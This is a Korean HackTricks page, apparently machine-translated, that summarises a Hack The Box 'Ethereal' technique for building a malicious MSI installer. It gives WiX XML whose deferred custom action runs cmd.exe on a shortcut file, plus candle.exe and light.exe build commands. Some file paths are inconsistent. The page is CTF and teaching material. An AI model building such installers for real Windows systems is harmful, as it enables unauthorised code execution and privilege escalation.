<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

# 악성 MSI 생성 및 루트 얻기

MSI 설치 프로그램의 생성은 wixtools를 사용하여 수행됩니다. 구체적으로 [wixtools](http://wixtoolset.org)을 사용할 것입니다. 다른 MSI 빌더를 시도해 보았지만, 이 경우에는 성공하지 못했습니다.

wix MSI 사용 예제에 대한 포괄적인 이해를 위해 [이 페이지](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)를 참고하는 것이 좋습니다. 여기에서 wix MSI 사용 예제를 보여주는 다양한 예제를 찾을 수 있습니다.

목표는 lnk 파일을 실행하는 MSI를 생성하는 것입니다. 이를 위해 다음의 XML 코드를 사용할 수 있습니다 ([여기에서 xml 가져옴](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
중요한 점은 Package 요소에는 InstallerVersion 및 Compressed와 같은 속성이 포함되어 있으며, 이는 설치 프로그램의 버전을 지정하고 패키지가 압축되었는지 여부를 나타냅니다.

생성 과정은 msi.xml에서 wixobject를 생성하기 위해 wixtools의 도구인 candle.exe를 활용하는 것입니다. 다음 명령을 실행해야 합니다:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
또한, 게시물에는 명령어와 그 결과를 보여주는 이미지가 제공되었으며, 시각적인 안내를 위해 참조할 수 있습니다.

또한, wixtools의 다른 도구인 light.exe를 사용하여 wixobject에서 MSI 파일을 생성할 것입니다. 실행할 명령어는 다음과 같습니다:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
이전 명령과 유사하게, 명령과 그 결과를 보여주는 이미지가 게시물에 포함되어 있습니다.

이 요약은 유용한 정보를 제공하기 위한 것이지만, 보다 포괄적인 세부 사항과 정확한 지침은 원본 게시물을 참조하는 것이 좋습니다.

## 참고 자료
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
